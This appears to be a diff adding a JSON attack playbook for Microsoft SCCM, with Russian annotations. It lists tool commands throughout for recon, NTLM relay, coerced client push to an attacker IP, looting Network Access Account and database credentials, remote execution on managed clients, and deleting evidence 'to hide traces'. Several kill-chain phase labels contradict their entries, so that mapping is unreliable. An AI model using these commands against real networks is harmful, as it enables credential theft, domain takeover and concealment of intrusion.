@@ -1,0 +1,212 @@
+[
+  {
+    "condition": "SCCM (Recon)",
+    "attack_type": "Enumeration via LDAP",
+    "tool": "ldeep / sccmhunter.py",
+    "req": "Domain User",
+    "command": "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm",
+    "profit": "SCCM Infrastructure Info",
+    "critical_note": "Разведка через LDAP для поиска объектов инфраструктуры SCCM.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "SCCM (Recon)",
+    "attack_type": "SMB Share Enumeration",
+    "tool": "nxc (NetExec)",
+    "req": "Domain User",
+    "command": "nxc smb <sccm_server> -u <user> -p <password> -d <domain> --shares",
+    "profit": "Shared Folders Info",
+    "critical_note": "Поиск доступных SMB-ресурсов на серверах SCCM.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "SCCM (Privilege Escalation)",
+    "attack_type": "Elevate-1: Relay on site systems",
+    "tool": "ntlmrelayx.py",
+    "req": "Simple user (Network Access)",
+    "command": "ntlmrelayx.py -tf <site_systems> -smb2support",
+    "profit": "Admin on Site system",
+    "critical_note": "Атака NTLM Relay на системы сайта SCCM.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "SCCM (Privilege Escalation)",
+    "attack_type": "Elevate-2: Force client push",
+    "tool": "SharpSCCM.exe",
+    "req": "Write access to request client install",
+    "command": "SharpSCCM.exe invoke client-push -mp <sccm_server>.<domain> -sc <site_code> -t A -d <attacker_ip> <dc_ip>",
+    "profit": "Incoming NTLM Auth",
+    "critical_note": "Принудительная установка клиента на машину атакующего для перехвата NTLM-аутентификации.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "SCCM (Privilege Escalation)",
+    "attack_type": "Elevate-3: Automatic client push",
+    "tool": "dnstool.py / setspn",
+    "req": "Simple user",
+    "command": "dnstool.py -u <domain>\\<user> -p <pass> -r <newcomputer>.<domain> -a add -t A -d <attacker_ip> <dc_ip>",
+    "profit": "Relay NTLM",
+    "critical_note": "Создание поддельной DNS-записи и SPN для несуществующего компьютера, чтобы спровоцировать автоматическую установку клиента SCCM и перехватить соединение.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "SCCM (Credential Dumping)",
+    "attack_type": "Creds-6: Loot creds (SMB)",
+    "tool": "cmloot.py",
+    "req": "Read access to SMB",
+    "command": "cmloot.py <domain>/<user>:<password>@<sccm_dp> -c cmlootinventory sccmfiles.txt",
+    "profit": "User + Pass / NAA",
+    "critical_note": "Поиск файлов с учетными данными на SMB-шарах точек распространения (DP).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "SCCM (Credential Dumping)",
+    "attack_type": "Creds-6: Loot creds (HTTP Policies)",
+    "tool": "SCCMSecrets.py",
+    "req": "HTTP access to Management Point",
+    "command": "SCCMSecrets.py policies -mp http://<management_point> -u '<machine_account>$' -p '<machine_password>' -cn '<client_name>'",
+    "profit": "User + Pass",
+    "critical_note": "Извлечение учетных данных из политик SCCM через HTTP.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "SCCM (Credential Dumping)",
+    "attack_type": "Creds-6: Loot creds (HTTP Files)",
+    "tool": "SCCMSecrets.py",
+    "req": "HTTP access to Distribution Point",
+    "command": "SCCMSecrets.py files -dp http://<distribution_point> -u '<user>' -p '<password>'",
+    "profit": "User + Pass",
+    "critical_note": "Скачивание чувствительных файлов с точки распространения через HTTP.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "SCCM (Credential Dumping)",
+    "attack_type": "Creds-6: HTTP Looter",
+    "tool": "sccm-http-looter",
+    "req": "Network Access",
+    "command": "sccm-http-looter -server <ip_dp>",
+    "profit": "Creds / Files",
+    "critical_note": "Автоматизированный сбор данных с HTTP-сервисов SCCM.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "SCCM (Takeover)",
+    "attack_type": "Takeover-1: Relay to MSSQL DB",
+    "tool": "sccmhunter.py / ntlmrelayx.py",
+    "req": "SCCM MSSQL != SCCM Server",
+    "command": "sccmhunter.py mssql -u <user> -p <password> -d <domain> ... -sc <site_code> -stacked",
+    "profit": "SCCM Admin",
+    "critical_note": "Повышение прав до администратора SCCM через релей на отдельный SQL-сервер базы данных.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "SCCM (Takeover)",
+    "attack_type": "Takeover-2: Relay to MSSQL Server",
+    "tool": "ntlmrelayx.py / smbexec.py",
+    "req": "SCCM MSSQL == SCCM Server",
+    "command": "ntlmrelayx.py -t <sccm_mssql> -smb2support -socks",
+    "profit": "Admin MSSQL",
+    "critical_note": "Релей NTLM на сам сервер SCCM (если он совмещен с SQL) для получения прав администратора SQL.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "SCCM (Credential Dumping)",
+    "attack_type": "Creds-2: Policy Request (Python)",
+    "tool": "sccmwtf.py",
+    "req": "Simple user, Add computer rights",
+    "command": "sccmwtf.py newcomputer newcomputer.<domain> <target>",
+    "profit": "NAA Credentials",
+    "critical_note": "Регистрация нового компьютера и запрос политик для получения Network Access Account (NAA) с помощью Python-скрипта.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "SCCM (Credential Dumping)",
+    "attack_type": "Creds-2: Policy Request (C#)",
+    "tool": "SharpSCCM.exe",
+    "req": "Simple user, Add computer rights",
+    "command": "SharpSCCM.exe get secrets -r newcomputer -u <computer_added>$ -p <computer_pass>",
+    "profit": "NAA Credentials",
+    "critical_note": "Аналог атаки Policy Request с использованием SharpSCCM.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "SCCM (Credential Dumping)",
+    "attack_type": "Creds-3: DPAPI Extraction",
+    "tool": "dploot.py",
+    "req": "Local Admin on SCCM/DP",
+    "command": "dploot.py sccm -u <admin> -p '<password>' <sccm_target>",
+    "profit": "NAA Credentials",
+    "critical_note": "Удаленное извлечение секретов SCCM через DPAPI.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "SCCM (Credential Dumping)",
+    "attack_type": "Creds-4: Local Secrets (Disk)",
+    "tool": "SharpSCCM.exe",
+    "req": "Local Access",
+    "command": "SharpSCCM.exe local secrets -m disk",
+    "profit": "NAA Credentials",
+    "critical_note": "Поиск зашифрованных секретов SCCM на локальном диске.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "SCCM (Credential Dumping)",
+    "attack_type": "Creds-4: Local Secrets (WMI)",
+    "tool": "SharpSCCM.exe",
+    "req": "Local Access",
+    "command": "SharpSCCM.exe local secrets -m wmi",
+    "profit": "NAA Credentials",
+    "critical_note": "Извлечение секретов SCCM из репозитория WMI.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "SCCM (Post-Exploitation)",
+    "attack_type": "Creds-5: SCCM Admin Extract",
+    "tool": "secretsdump.py / mssqlclient.py",
+    "req": "SCCM Admin / SQL Admin",
+    "command": "secretsdump.py <domain>/<admin>:<pass>@<sccm_target> && mssqlclient.py ...",
+    "profit": "Site DB Credentials",
+    "critical_note": "Дамп учетных данных из базы данных сайта через прямой SQL-запрос к таблице SC_UserAccount.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "SCCM (Lateral Movement)",
+    "attack_type": "EXEC-1: SCCM Admin Execution",
+    "tool": "SharpSCCM.exe",
+    "req": "SCCM Admin",
+    "command": "SharpSCCM.exe exec -p <binary> -d <device_name> -sms <SMS_PROVIDER> -sc <SITECODE> --no-banner",
+    "profit": "RCE",
+    "critical_note": "Выполнение команд на клиентах SCCM через легитимный канал управления.",
+    "kill_chain_phase": "ACCESS"
+  },
+  {
+    "condition": "SCCM (Lateral Movement)",
+    "attack_type": "EXEC-2: SCCM Admin Execution (Python)",
+    "tool": "sccmhunter.py",
+    "req": "SCCM Admin",
+    "command": "sccmhunter.py admin -u <user>@<domain> -p '<password>' -ip <sccm_ip>",
+    "profit": "RCE",
+    "critical_note": "Альтернативный метод выполнения команд через sccmhunter.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "SCCM (Cleanup)",
+    "attack_type": "Cleanup Device",
+    "tool": "SharpSCCM.exe",
+    "req": "SCCM Admin / Access to SMS Provider",
+    "command": "SharpSCCM.exe remove device GUID:<GUID> -sms <SMS_PROVIDER> -sc <SITECODE>",
+    "profit": "Stealth",
+    "critical_note": "Удаление созданного вредоносного устройства из базы данных SCCM для сокрытия следов.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "SCCM (Post-Exploitation)",
+    "attack_type": "User Hunting",
+    "tool": "SCCMHound.exe",
+    "req": "Read access to SCCM DB",
+    "command": "SCCMHound.exe --server <server> --sitecode <sitecode>",
+    "profit": "Users sessions",
+    "critical_note": "Картирование пользовательских сессий в сети на основе данных SCCM.",
+    "kill_chain_phase": "ACCESS"
+  }
+]
